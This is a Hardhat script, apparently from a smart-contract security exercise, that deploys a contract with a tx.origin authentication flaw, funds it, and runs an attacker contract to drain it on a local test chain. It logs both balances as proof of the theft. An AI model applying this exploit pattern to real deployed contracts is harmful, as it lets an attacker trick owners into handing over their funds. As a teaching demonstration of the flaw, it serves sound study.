import { ethers } from "hardhat"

async function main() {

    const vuln = await ethers.deployContract("txOrigin")
    await vuln.waitForDeployment()

    const [acc1, acc2] = await ethers.getSigners()

    await acc1.sendTransaction({to: vuln.target, value : ethers.parseEther('1') })

    //This thing so far, is what we need to set up the vulnerability.
    //Beyond, will be the exploit


    //Here, we set up the exploit contract
    const exploit = await ethers.getContractFactory("txOriginEx")
    const vulnEx = await exploit.connect(acc2).deploy(vuln.target)

    
    //@ts-ignore
    await vulnEx.connect(acc1).ExploitTxOrigin()
    //The idea actually, is that we have to make the contract owner unknowingly call our contract, such that its function would then
    //Recursively call his contract again and extract all his funds.

    //Getting a fallback function to run will be better. Or when it runs when the user sends some ether to the contract
    //Regardless, the above statement will make the exploit work

    console.log(`The Vulnerable Contract has been exploited`)
    console.log(`Remaining balance there is : ${await ethers.provider.getBalance(vuln.target)}`)

    console.log("")
    console.log(`Balance in attacker contract is ${await ethers.provider.getBalance(vulnEx.target)}`)
    //This was for proof of completion



}

main().catch((error) => {
    console.error(error)
    process.exitCode=1
})